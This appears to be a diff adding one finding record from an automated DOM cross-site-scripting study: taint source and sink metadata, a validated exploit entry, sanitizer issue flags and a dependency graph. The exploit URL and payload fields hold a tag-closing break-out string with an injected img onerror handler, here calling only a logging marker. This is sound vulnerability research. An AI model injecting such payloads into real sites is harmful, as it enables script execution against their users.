@@ -1,0 +1,78 @@
+// Finding: c8e95950-847d-454c-adac-5f5901d5da92
+// Finding.url: https://xx.example328.com/h/papers-cat117/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('7f4929a5e95a4ab1a74b82806e8198fa')><!--/*
+// Finding.parentloc: https://xx.example328.com/h/papers-cat117/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('7f4929a5e95a4ab1a74b82806e8198fa')><!--/*
+// Finding.domain: xx.example328.com
+// Finding.base_domain: example328.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: 
+// Sanitizer.location: https://zxxkstatic.example328.com/xkwjs/modules/jquery.xdk.js?v=0.0132 - <anonymous>:58:15
+// Finding.begin: 624
+// Finding.end: 672
+// Finding.original_uuid: 9b18e34c-8196-450e-a400-500cd19780da
+// Finding.TwentyFiveMillionFlowsId: -471216775
+// Finding.script: https://zxxkstatic.example328.com/xkwjs/lib/jquery-1.10.2.js?v=0.0132
+// Finding.line: 1
+// Exploit.uuid: 7f4929a5-e95a-4ab1-a74b-82806e8198fa
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 36
+// Exploit.replace_begin_url: 36
+// Exploit.replace_end_url: 36
+// Exploit.replace_begin_param: 672
+// Exploit.replace_end_param: 672
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: true
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -364028955
+// DepGraph.sanitizer_hash: 985755791
+// Part of the URL ('##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('7f4929a5e95a4ab1a74b82806e8198fa')><!--/*') found in left hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="Lit: ##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('7f4929a5e95a4ab1a74b82806e8198fa')><!--/*"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="preg_replace"];
+n6 [shape=box, label="RegExp: /[&]/"];
+n7 [shape=box, label="Lit: ____"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n9 -> n5;
+n10 -> n9;
+}
